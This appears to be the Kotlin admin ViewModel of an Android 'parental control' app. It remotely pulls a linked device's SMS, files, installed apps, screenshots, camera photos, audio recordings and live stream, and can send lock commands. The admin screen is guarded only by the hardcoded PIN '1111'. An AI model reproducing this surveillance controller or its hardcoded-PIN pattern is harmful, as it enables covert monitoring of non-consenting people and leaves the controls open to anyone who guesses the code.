package com.example.admin

import android.app.Application
import android.content.Context
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.ToneGenerator
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream

class AdminViewModel(application: Application) : AndroidViewModel(application) {
    private val connector = FirebaseAdminConnector()

    // PIN protection state
    private val _isUnlocked = MutableStateFlow(false)
    val isUnlocked: StateFlow<Boolean> = _isUnlocked.asStateFlow()

    // Devices & Loading states
    private val _devices = MutableStateFlow<List<Device>>(emptyList())
    val devices: StateFlow<List<Device>> = _devices.asStateFlow()

    private val _selectedDeviceToken = MutableStateFlow<String?>(null)
    val selectedDeviceToken: StateFlow<String?> = _selectedDeviceToken.asStateFlow()

    private val _isLoading = MutableStateFlow(false)
    val isLoading: StateFlow<Boolean> = _isLoading.asStateFlow()

    // Device-specific sync states
    private val _smsLogs = MutableStateFlow<List<SmsLog>>(emptyList())
    val smsLogs: StateFlow<List<SmsLog>> = _smsLogs.asStateFlow()

    private val _securityAlerts = MutableStateFlow<List<SecurityAlert>>(emptyList())
    val securityAlerts: StateFlow<List<SecurityAlert>> = _securityAlerts.asStateFlow()

    private val _installedApps = MutableStateFlow<List<InstalledApp>>(emptyList())
    val installedApps: StateFlow<List<InstalledApp>> = _installedApps.asStateFlow()

    private val _fileItems = MutableStateFlow<List<FileItem>>(emptyList())
    val fileItems: StateFlow<List<FileItem>> = _fileItems.asStateFlow()

    private val _currentPath = MutableStateFlow("/storage/emulated/0")
    val currentPath: StateFlow<String> = _currentPath.asStateFlow()

    // Media and responses states
    private val _screenshot = MutableStateFlow<MediaItem?>(null)
    val screenshot: StateFlow<MediaItem?> = _screenshot.asStateFlow()

    private val _cameraPhoto = MutableStateFlow<MediaItem?>(null)
    val cameraPhoto: StateFlow<MediaItem?> = _cameraPhoto.asStateFlow()

    private val _audioRecord = MutableStateFlow<MediaItem?>(null)
    val audioRecord: StateFlow<MediaItem?> = _audioRecord.asStateFlow()

    private val _commandResponse = MutableStateFlow<Pair<String, String>?>(null)
    val commandResponse: StateFlow<Pair<String, String>?> = _commandResponse.asStateFlow()

    private val _statusMessage = MutableStateFlow<String?>(null)
    val statusMessage: StateFlow<String?> = _statusMessage.asStateFlow()

    private val _liveStreamState = MutableStateFlow<LiveStreamState?>(null)
    val liveStreamState: StateFlow<LiveStreamState?> = _liveStreamState.asStateFlow()

    // Polling and synchronization jobs
    private var syncJob: Job? = null
    private var streamPollingJob: Job? = null
    private var lastKnownAlertTime = 0L

    // Database URL and status states
    private val prefs = application.getSharedPreferences("admin_prefs", Context.MODE_PRIVATE)
    
    private val _currentDatabaseUrl = MutableStateFlow(
        prefs.getString("db_url", "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com") ?: "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com"
    )
    val currentDatabaseUrl: StateFlow<String> = _currentDatabaseUrl.asStateFlow()

    private val _connectionError = MutableStateFlow<String?>(null)
    val connectionError: StateFlow<String?> = _connectionError.asStateFlow()

    // Audio Player State
    private var mediaPlayer: MediaPlayer? = null
    private var tempAudioFile: File? = null
    private var audioProgressJob: Job? = null

    private val _isAudioPlaying = MutableStateFlow(false)
    val isAudioPlaying: StateFlow<Boolean> = _isAudioPlaying.asStateFlow()

    private val _audioDuration = MutableStateFlow(0)
    val audioDuration: StateFlow<Int> = _audioDuration.asStateFlow()

    private val _audioPosition = MutableStateFlow(0)
    val audioPosition: StateFlow<Int> = _audioPosition.asStateFlow()

    init {
        connector.updateRootUrl(_currentDatabaseUrl.value)
        viewModelScope.launch {
            autoDetectDatabaseUrl()
            loadAllDevicesAndStartSync()
        }
    }

    fun updateDatabaseUrl(url: String) {
        val cleanedUrl = url.trim().removeSuffix("/")
        prefs.edit().putString("db_url", cleanedUrl).apply()
        _currentDatabaseUrl.value = cleanedUrl
        connector.updateRootUrl(cleanedUrl)
        _connectionError.value = null
        // Trigger reload
        loadAllDevicesAndStartSync()
    }

    private suspend fun autoDetectDatabaseUrl() {
        val current = _currentDatabaseUrl.value
        val candidates = listOf(
            "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com",
            "https://studio-3242759193-af8cb-default-rtdb.europe-west1.firebasedatabase.app",
            "https://studio-3242759193-af8cb.firebaseio.com",
            "https://studio-3242759193-af8cb.europe-west1.firebasedatabase.app",
            "https://studio-3242759193-af8cb-default-rtdb.asia-southeast1.firebasedatabase.app",
            "https://studio-3242759193-af8cb.asia-southeast1.firebasedatabase.app"
        )
        
        // Try current saved first
        if (testUrlReachable(current)) {
            Log.d("AdminViewModel", "Saved DB URL is working: $current")
            return
        }
        
        // Otherwise, probe candidates
        for (candidate in candidates) {
            if (candidate != current && testUrlReachable(candidate)) {
                Log.d("AdminViewModel", "Found responsive candidate, auto-switching: $candidate")
                updateDatabaseUrl(candidate)
                return
            }
        }
    }

    private suspend fun testUrlReachable(url: String): Boolean = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
        try {
            val client = okhttp3.OkHttpClient.Builder()
                .connectTimeout(3, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(3, java.util.concurrent.TimeUnit.SECONDS)
                .build()
            val req = okhttp3.Request.Builder()
                .url("$url/.json?shallow=true")
                .get()
                .build()
            client.newCall(req).execute().use { resp ->
                // As long as the request resolved (even if permission denied / 401 / 403), it means the URL is reachable
                return@withContext true
            }
        } catch (e: Throwable) {
            Log.e("AdminViewModel", "Database URL $url is not reachable", e)
            return@withContext false
        }
    }

    fun unlockWithPin(pin: String): Boolean {
        return if (pin == "1111") { // Default Parental code is 1111 as requested
            _isUnlocked.value = true
            true
        } else {
            false
        }
    }

    fun lockPIN() {
        _isUnlocked.value = false
    }

    fun clearStatusMessage() {
        _statusMessage.value = null
    }

    fun registerDeviceManually(token: String, name: String) {
        viewModelScope.launch {
            _isLoading.value = true
            val success = connector.registerNewDeviceToken(token, name)
            _isLoading.value = false
            if (success) {
                _statusMessage.value = "تم ربط جهاز الطفل بنجاح!"
                loadAllDevicesAndStartSync()
                selectDevice(token)
            } else {
                _statusMessage.value = "فشل ربط جهاز الطفل، تأكد من الاتصال بقاعدة البيانات."
            }
        }
    }

    fun selectDevice(token: String) {
        _selectedDeviceToken.value = token
        // Reset device dependent views
        _smsLogs.value = emptyList()
        _securityAlerts.value = emptyList()
        _installedApps.value = emptyList()
        _fileItems.value = emptyList()
        _currentPath.value = "/storage/emulated/0"
        _screenshot.value = null
        _cameraPhoto.value = null
        _audioRecord.value = null
        _commandResponse.value = null
        _liveStreamState.value = null
        streamPollingJob?.cancel()
        stopAudio()
        
        // Trigger intermediate fetch
        triggerSingleDeviceFetch(token)
    }

    fun loadAllDevicesAndStartSync() {
        syncJob?.cancel()
        syncJob = viewModelScope.launch {
            while (true) {
                try {
                    val list = connector.getDiscoveredDevices()
                    _devices.value = list
                    _connectionError.value = null

                    _selectedDeviceToken.value?.let { token ->
                        if (token.isNotBlank()) {
                            // Sync current device details and streams
                            syncCurrentDeviceAll(token)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("AdminViewModel", "Error in sync loop", e)
                    _connectionError.value = e.localizedMessage ?: e.message ?: "فشل الاتصال بخادم قاعدة البيانات"
                }
                delay(4000) // Poll every 4 seconds for immediate action
            }
        }
    }

    private fun triggerSingleDeviceFetch(token: String) {
        viewModelScope.launch {
            if (token.isNotBlank()) {
                syncCurrentDeviceAll(token)
            }
        }
    }

    private suspend fun syncCurrentDeviceAll(token: String) {
        if (token.isBlank()) return
        // 1. Fetch SMS Logs
        val sms = connector.getSmsLogs(token)
        _smsLogs.value = sms

        // 2. Fetch Installed Apps
        val apps = connector.getInstalledApps(token)
        _installedApps.value = apps

        // 3. Fetch File System Tree
        val files = connector.getFileSystem(token)
        _fileItems.value = files

        // 4. Fetch Screenshot
        _screenshot.value = connector.getScreenshot(token)

        // 5. Fetch Photo
        _cameraPhoto.value = connector.getCameraPhoto(token)

        // 6. Fetch Audio Record
        _audioRecord.value = connector.getAudioRecord(token)

        // 7. Get last command response
        _commandResponse.value = connector.getCommandResponse(token)

        // 8. Fetch Alerts
        val alerts = connector.getSecurityAlerts(token)
        _securityAlerts.value = alerts
        checkForNewAlert(alerts)

        // 9. Fetch Live Stream state silently (if not already fast-polling)
        if (streamPollingJob?.isActive != true) {
            _liveStreamState.value = connector.getLiveStreamState(token)
        }
    }

    private fun checkForNewAlert(alerts: List<SecurityAlert>) {
        if (alerts.isNotEmpty()) {
            val latest = alerts.first()
            if (latest.timestamp > lastKnownAlertTime) {
                lastKnownAlertTime = latest.timestamp
                // If this is not the first boot load of the ViewModel, ring/vibrate
                triggerAlertNotification()
            }
        }
    }

    private fun triggerAlertNotification() {
        val context = getApplication<Application>().applicationContext
        try {
            // 1. Sound BEEP
            ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100)
                .startTone(ToneGenerator.TONE_PROP_BEEP, 150)

            // 2. Vibrate
            @Suppress("DEPRECATION")
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator
            vibrator?.let {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    it.vibrate(VibrationEffect.createOneShot(450, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    it.vibrate(450)
                }
            }
        } catch (e: Throwable) {
            Log.e("AdminViewModel", "Error sounding alert feedback", e)
        }
    }

    // REMOTE COMMAND DISPATCHER
    fun runCommand(commandType: String, params: Map<String, Any> = emptyMap()) {
        val token = _selectedDeviceToken.value
        if (token == null) {
            _statusMessage.value = "الرجاء تحديد جهاز طفل أولا."
            return
        }
        viewModelScope.launch {
            _statusMessage.value = "جاري إرسال الأمر: $commandType..."
            val success = connector.sendCommandToChild(token, commandType, params)
            if (success) {
                _statusMessage.value = "تم إرسال الأمر بنجاح! في انتظار جهاز الطفل..."
            } else {
                _statusMessage.value = "فشل اتصال التحكم بقاعدة البيانات."
            }
        }
    }

    fun changeLockStatus(shouldLock: Boolean) {
        val command = if (shouldLock) "lock_device" else "unlock_device"
        runCommand(command)
    }

    fun requestScreenshot() {
        runCommand("take_screenshot")
    }

    fun requestPhoto(frontCamera: Boolean) {
        val cameraParam = if (frontCamera) "front" else "back"
        runCommand("take_photo", mapOf(
            "camera" to cameraParam,
            "isFront" to frontCamera
        ))
    }

    fun requestAudioRecord() {
        runCommand("record_audio")
    }

    fun requestAppsList() {
        runCommand("list_apps")
    }

    fun exploreDirectory(path: String) {
        _currentPath.value = path
        runCommand("list_directory", mapOf("path" to path))
    }

    fun clearAlerts() {
        val token = _selectedDeviceToken.value ?: return
        viewModelScope.launch {
            val success = connector.clearSecurityAlerts(token)
            if (success) {
                _securityAlerts.value = emptyList()
                _statusMessage.value = "تم تصفية جدار التنبيهات بنجاح"
            }
        }
    }

    // AUDIO PLAYBACK MANAGEMENT
    fun loadAndPlayAudio(base64Data: String) {
        val context = getApplication<Application>().applicationContext
        viewModelScope.launch {
            try {
                stopAudio()
                
                // Write Temp Music File
                val decodedBytes = android.util.Base64.decode(base64Data, android.util.Base64.DEFAULT)
                tempAudioFile = File.createTempFile("child_audio_rx", ".3gp", context.cacheDir).apply {
                    deleteOnExit()
                    FileOutputStream(this).use { fos ->
                        fos.write(decodedBytes)
                    }
                }

                mediaPlayer = MediaPlayer().apply {
                    setDataSource(tempAudioFile!!.absolutePath)
                    prepare()
                    _audioDuration.value = duration
                    start()
                    _isAudioPlaying.value = true
                }

                // Monitor playback progress
                audioProgressJob?.cancel()
                audioProgressJob = viewModelScope.launch {
                    while (_isAudioPlaying.value) {
                        mediaPlayer?.let { mp ->
                            if (mp.isPlaying) {
                                _audioPosition.value = mp.currentPosition
                            } else {
                                _isAudioPlaying.value = false
                            }
                        }
                        delay(250)
                    }
                }

                mediaPlayer?.setOnCompletionListener {
                    stopAudio()
                }

            } catch (e: Exception) {
                Log.e("AdminViewModel", "MediaPlayer playback error", e)
                _statusMessage.value = "فشل تشغيل ملف الصوت المرمز: ${e.localizedMessage}"
            }
        }
    }

    fun pauseAudio() {
        mediaPlayer?.let {
            if (it.isPlaying) {
                it.pause()
                _isAudioPlaying.value = false
            }
        }
    }

    fun resumeAudio() {
        mediaPlayer?.let {
            it.start()
            _isAudioPlaying.value = true
            // Restart progress monitoring
            audioProgressJob?.cancel()
            audioProgressJob = viewModelScope.launch {
                while (_isAudioPlaying.value) {
                    mediaPlayer?.let { mp ->
                        if (mp.isPlaying) {
                            _audioPosition.value = mp.currentPosition
                        } else {
                            _isAudioPlaying.value = false
                        }
                    }
                    delay(250)
                }
            }
        }
    }

    fun seekAudio(positionMs: Int) {
        mediaPlayer?.let {
            it.seekTo(positionMs)
            _audioPosition.value = positionMs
        }
    }

    fun stopAudio() {
        audioProgressJob?.cancel()
        _isAudioPlaying.value = false
        _audioPosition.value = 0
        try {
            mediaPlayer?.apply {
                if (isPlaying) stop()
                release()
            }
        } catch (e: Exception) {
            // Ignore
        }
        mediaPlayer = null
        tempAudioFile?.delete()
        tempAudioFile = null
    }

    fun startLiveStream() {
        val token = _selectedDeviceToken.value ?: return
        runCommand("start_stream")
        
        // Start high-frequency stream-polling
        streamPollingJob?.cancel()
        streamPollingJob = viewModelScope.launch {
            while (true) {
                try {
                    val state = connector.getLiveStreamState(token)
                    _liveStreamState.value = state
                } catch (e: Exception) {
                    Log.e("AdminViewModel", "Error in stream polling", e)
                }
                delay(1200) // Poll every 1.2s
            }
        }
    }

    fun stopLiveStream() {
        runCommand("stop_stream")
        streamPollingJob?.cancel()
        _liveStreamState.value = _liveStreamState.value?.copy(isActive = false)
    }

    override fun onCleared() {
        super.onCleared()
        syncJob?.cancel()
        streamPollingJob?.cancel()
        stopAudio()
    }
}
